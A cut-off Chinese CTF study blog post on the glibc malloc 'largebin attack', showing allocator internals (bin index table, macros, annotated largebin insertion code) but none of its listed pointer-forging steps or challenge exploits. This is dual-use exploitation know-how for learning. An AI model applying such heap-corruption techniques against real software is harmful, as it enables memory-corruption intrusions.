<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Largebin-attack总结 | ScUpax0s</title><meta name="description" content="Largebin attack总结咕咕咕好几天的largebin attack来力 largebin管理思想概览 当chunk被插入unsortedbin的时候，如果我们再去申请，此时从unsortedbin末尾开始遍历，倘若遍历到的不符合我们的要求大小，那么系统会做sorted——重新把这个chunk放入smallbin或者largebin  1234567#define in_smallbin"><meta name="keywords" content="largebin"><meta name="author" content="Paxos"><meta name="copyright" content="Paxos"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Largebin-attack总结"><meta name="twitter:description" content="Largebin attack总结咕咕咕好几天的largebin attack来力 largebin管理思想概览 当chunk被插入unsortedbin的时候，如果我们再去申请，此时从unsortedbin末尾开始遍历，倘若遍历到的不符合我们的要求大小，那么系统会做sorted——重新把这个chunk放入smallbin或者largebin  1234567#define in_smallbin"><meta name="twitter:image" content="https://s1.ax1x.com/2020/08/31/dOgQ4x.jpg"><meta property="og:type" content="article"><meta property="og:title" content="Largebin-attack总结"><meta property="og:url" content="http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/"><meta property="og:site_name" content="ScUpax0s"><meta property="og:description" content="Largebin attack总结咕咕咕好几天的largebin attack来力 largebin管理思想概览 当chunk被插入unsortedbin的时候，如果我们再去申请，此时从unsortedbin末尾开始遍历，倘若遍历到的不符合我们的要求大小，那么系统会做sorted——重新把这个chunk放入smallbin或者largebin  1234567#define in_smallbin"><meta property="og:image" content="https://s1.ax1x.com/2020/08/31/dOgQ4x.jpg"><meta property="article:published_time" content="2020-08-31T08:07:52.000Z"><meta property="article:modified_time" content="2020-08-31T08:24:52.550Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/"><link rel="prev" title="bctf2018_baby_arena（FSOP+global_max_fast）" href="http://yoursite.com/2020/09/02/bctf2018-baby-arena%EF%BC%88FSOP-global-max-fast%EF%BC%89/"><link rel="next" title="ciscnCTF2020-pwn" href="http://yoursite.com/2020/08/21/ciscnCTF2020-pwn/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://s1.ax1x.com/2020/06/15/N9ZTBV.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">63</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">34</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-diamond" aria-hidden="true"></i><span> Life</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> talk</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Largebin-attack总结"><span class="toc-number">1.</span> <span class="toc-text">Largebin attack总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#largebin管理思想概览"><span class="toc-number">1.1.</span> <span class="toc-text">largebin管理思想概览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源码分析"><span class="toc-number">1.2.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#宏define-builtin-expect"><span class="toc-number">1.2.1.</span> <span class="toc-text">宏define __builtin_expect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宏bin-at"><span class="toc-number">1.2.2.</span> <span class="toc-text">宏bin_at</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宏mark-bin"><span class="toc-number">1.2.3.</span> <span class="toc-text">宏mark_bin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bitmap"><span class="toc-number">1.2.4.</span> <span class="toc-text">bitmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebin的插入相关操作"><span class="toc-number">1.2.5.</span> <span class="toc-text">largebin的插入相关操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebin的取出相关操作"><span class="toc-number">1.2.6.</span> <span class="toc-text">largebin的取出相关操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#伪造Largebin的bk-nextsize（取出时）"><span class="toc-number">1.3.</span> <span class="toc-text">伪造Largebin的bk_nextsize（取出时）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#伪造largebin的bk-nextsize以及bk（插入largebin时）"><span class="toc-number">1.4.</span> <span class="toc-text">伪造largebin的bk_nextsize以及bk（插入largebin时）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例题1：0ctf-2018-heapstorm2（插入时攻击）"><span class="toc-number">2.</span> <span class="toc-text">例题1：0ctf_2018_heapstorm2（插入时攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目概览"><span class="toc-number">2.1.</span> <span class="toc-text">题目概览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击过程"><span class="toc-number">2.2.</span> <span class="toc-text">攻击过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例题2：LCTF2017-2ez4u-取出时攻击"><span class="toc-number">3.</span> <span class="toc-text">例题2：LCTF2017-2ez4u(取出时攻击)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目概览-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目概览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击过程-1"><span class="toc-number">3.2.</span> <span class="toc-text">攻击过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#番外篇——关于fastbin的合并"><span class="toc-number">4.</span> <span class="toc-text">番外篇——关于fastbin的合并</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#合并时机"><span class="toc-number">4.1.</span> <span class="toc-text">合并时机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在申请large-chunk时"><span class="toc-number">4.1.1.</span> <span class="toc-text">在申请large chunk时</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#当申请的chunk需要申请新的top-chunk时"><span class="toc-number">4.1.2.</span> <span class="toc-text">当申请的chunk需要申请新的top chunk时</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free的堆块大小大于fastbin中的最大size。（注意这里并不是指当前fastbin中最大chunk的size，而是指fastbin中所定义的最大chunk的size，是一个固定值。）"><span class="toc-number">4.1.3.</span> <span class="toc-text">free的堆块大小大于fastbin中的最大size。（注意这里并不是指当前fastbin中最大chunk的size，而是指fastbin中所定义的最大chunk的size，是一个固定值。）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#合并过程"><span class="toc-number">4.2.</span> <span class="toc-text">合并过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-consolidate既可以作为fastbin的初始化函数，也可以作为fastbin的合并函数。"><span class="toc-number">4.2.1.</span> <span class="toc-text">malloc_consolidate既可以作为fastbin的初始化函数，也可以作为fastbin的合并函数。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://s1.ax1x.com/2020/08/31/dOgQ4x.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">ScUpax0s</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-diamond" aria-hidden="true"></i><span> Life</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> talk</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">Largebin-attack总结</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2020-08-31 16:07:52"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2020-08-31</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-08-31 16:24:52"><i class="fa fa-history" aria-hidden="true"></i> Updated 2020-08-31</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%F0%9F%93%92/">学习笔记📒</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>Comments:</span><span class="disqus-comment-count comment-count"><a href="http://yoursite.com/2020/08/31/Largebin-attack%E6%80%BB%E7%BB%93/#disqus_thread"></a></span></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="Largebin-attack总结"><a href="#Largebin-attack总结" class="headerlink" title="Largebin attack总结"></a>Largebin attack总结</h1><p>咕咕咕好几天的largebin attack来力</p>
<h2 id="largebin管理思想概览"><a href="#largebin管理思想概览" class="headerlink" title="largebin管理思想概览"></a>largebin管理思想概览</h2><ul>
<li>当chunk被插入unsortedbin的时候，如果我们再去申请，此时从unsortedbin末尾开始遍历，倘若遍历到的不符合我们的要求大小，那么系统会做sorted——重新把这个chunk放入smallbin或者largebin</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  </span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>64位系统中大于0x400的为largebin范围，32位大于0x200（不带tcache）</li>
<li>fd_nextsize指向比他小的最大的chunk，bk_nextsize指向比他大的最小的chunk（不同索引的largebin），并且是首位循环连接。</li>
<li>largebin中不只有一条链，有、复杂</li>
<li>largebin中size与index的对应如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">size</span>	index</span><br><span class="line">[<span class="number">0x400</span> , <span class="number">0x440</span>)	<span class="number">64</span></span><br><span class="line">[<span class="number">0x440</span> , <span class="number">0x480</span>)	<span class="number">65</span></span><br><span class="line">[<span class="number">0x480</span> , <span class="number">0x4C0</span>)	<span class="number">66</span></span><br><span class="line">[<span class="number">0x4C0</span> , <span class="number">0x500</span>)	<span class="number">67</span></span><br><span class="line">[<span class="number">0x500</span> , <span class="number">0x540</span>)	<span class="number">68</span></span><br><span class="line">等差 <span class="number">0x40</span>	…</span><br><span class="line">[<span class="number">0xC00</span> , <span class="number">0xC40</span>)	<span class="number">96</span></span><br><span class="line">[<span class="number">0xC40</span> , <span class="number">0xE00</span>)	<span class="number">97</span></span><br><span class="line">[<span class="number">0xE00</span> , <span class="number">0x1000</span>)	<span class="number">98</span></span><br><span class="line">[<span class="number">0x1000</span> , <span class="number">0x1200</span>)	<span class="number">99</span></span><br><span class="line">[<span class="number">0x1200</span> , <span class="number">0x1400</span>)	<span class="number">100</span></span><br><span class="line">[<span class="number">0x1400</span> , <span class="number">0x1600</span>)	<span class="number">101</span></span><br><span class="line">等差 <span class="number">0x200</span>	…</span><br><span class="line">[<span class="number">0x2800</span> , <span class="number">0x2A00</span>)	<span class="number">111</span></span><br><span class="line">[<span class="number">0x2A00</span> , <span class="number">0x3000</span>)	<span class="number">112</span></span><br><span class="line">[<span class="number">0x3000</span> , <span class="number">0x4000</span>)	<span class="number">113</span></span><br><span class="line">[<span class="number">0x4000</span> , <span class="number">0x5000</span>)	<span class="number">114</span></span><br><span class="line">等差 <span class="number">0x1000</span>	…</span><br><span class="line">[<span class="number">0x9000</span> , <span class="number">0xA000</span>)	<span class="number">119</span></span><br><span class="line">[<span class="number">0xA000</span> , <span class="number">0x10000</span>)	<span class="number">120</span></span><br><span class="line">[<span class="number">0x10000</span> , <span class="number">0x18000</span>)	<span class="number">121</span></span><br><span class="line">[<span class="number">0x18000</span> , <span class="number">0x20000</span>)	<span class="number">122</span></span><br><span class="line">[<span class="number">0x20000</span> , <span class="number">0x28000</span>)	<span class="number">123</span></span><br><span class="line">[<span class="number">0x28000</span> , <span class="number">0x40000</span>)	<span class="number">124</span></span><br><span class="line">[<span class="number">0x40000</span> , <span class="number">0x80000</span>)	<span class="number">125</span></span><br><span class="line">[<span class="number">0x80000</span> , …. )	<span class="number">126</span></span><br></pre></td></tr></table></figure>

<p>largebin管理的是一个范围区间的堆块，此时<code>fd_nextsize</code>与<code>bk_nextsize</code>就派上了用场。</p>
<p>大小对应相同index中的堆块，其在链表中的排序方式为：</p>
<ul>
<li>堆块从大到小排序。</li>
<li>对于相同大小的堆块，最先释放的堆块会成为堆头，其<code>fd_nextsize</code>与<code>bk_nextsize</code>会被赋值，其余的堆块释放后都会插入到该堆头结点的下一个结点，通过<code>fd</code>与<code>bk</code>链接，形成了先释放的在链表后面的排序方式，且其<code>fd_nextsize</code>与<code>bk_nextsize</code>都为0。</li>
<li>不同大小的堆块通过堆头串联，即堆头中<code>fd_nextsize</code>指向比它小的堆块的堆头，<code>bk_nextsize</code>指向比它大的堆块的堆头，从而形成了第一点中的从大到小排序堆块的方式。同时最大的堆块的堆头的<code>bk_nextsize</code>指向最小的堆块的堆头，最小堆块的堆头的<code>fd_nextsize</code>指向最大堆块的堆头，以此形成循环双链表。</li>
</ul>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="宏define-builtin-expect"><a href="#宏define-builtin-expect" class="headerlink" title="宏define __builtin_expect"></a>宏define __builtin_expect</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br></pre></td></tr></table></figure>

<p>貌似就是取expr表达式的值。</p>
<h3 id="宏bin-at"><a href="#宏bin-at" class="headerlink" title="宏bin_at"></a>宏bin_at</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))               \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure>

<p><strong>宏 bin_at(m, i) 通过 bin index 获得 bin 的链表头</strong>，m 指的是分配区，i 是索引</p>
<h3 id="宏mark-bin"><a href="#宏mark-bin" class="headerlink" title="宏mark_bin"></a>宏mark_bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br></pre></td></tr></table></figure>

<p>mark_bin 设置第 i 个 bin 在 binmap 中对应的 bit 位为 1</p>
<h3 id="bitmap"><a href="#bitmap" class="headerlink" title="bitmap"></a>bitmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT) <span class="comment">// 32</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)<span class="comment">// 128 / 32 = 4</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];             <span class="comment">// 32b * 4 = 128b</span></span><br></pre></td></tr></table></figure>

<p>一共有 128 个 bin，0 和 127 不算，也就是有 126 个 bin，其中第一个 bin 是 unsorted_bin</p>
<p><strong>binmap 字段是一个 int 数组，ptmalloc 用一个 bit 来标识该 bit 对应的 bin 中是否包含空闲 chunk</strong></p>
<h3 id="largebin的插入相关操作"><a href="#largebin的插入相关操作" class="headerlink" title="largebin的插入相关操作"></a>largebin的插入相关操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (<span class="built_in">size</span>))		<span class="comment">//如果是smallbin的大小就放到smallbin</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (<span class="built_in">size</span>);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span>													<span class="comment">//如果是largebin的大小，那么：</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (<span class="built_in">size</span>);<span class="comment">//根据size获取对应的largebin索引</span></span><br><span class="line">             bck = bin_at (av, victim_index);		 <span class="comment">//获取largebin表头</span></span><br><span class="line">             fwd = bck-&gt;fd;											 <span class="comment">//获取对应索引largebin的第一个chunk（循环链表的head-&gt;next）</span></span><br><span class="line"></span><br><span class="line">             <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">             <span class="keyword">if</span> (fwd != bck)											<span class="comment">//当第一个不等于最后一个（即当前的largebin不空）</span></span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                 <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">                 <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                 assert (chunk_main_arena (bck-&gt;bk));	<span class="comment">//是否在main_arena?（主线程）</span></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>)</span><br><span class="line">	      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//bck-&gt;bk储存的是当前索引的largebin中大小最小的chunk，如果我们要插入的chunk比这个大小还小，那么就要插入largebin的尾部。</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;									<span class="comment">//fwd此时为largebin表头</span></span><br><span class="line">                     bck = bck-&gt;bk;							<span class="comment">//bck设置为largebin中最后一个的chunk</span></span><br><span class="line"></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="comment">//由于我们要插入的在末尾，比他小的就是循环回去的第一个chunk</span></span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//比他大的就是之前的最小的那个</span></span><br><span class="line">                     </span><br><span class="line">                     <span class="comment">//原来链表的第一个chunk的bk指向此时新插入的最后一个chunk</span></span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = </span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 </span><br><span class="line">                 <span class="comment">// 如果不是插入尾部，那么我们要找到这个chunk应该插入的位置</span></span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                     <span class="comment">//使用这个while循环尝试从链表头部开始遍历，直到找到一个比victim大或等于的chunk退出while</span></span><br><span class="line">                     <span class="keyword">while</span> ((<span 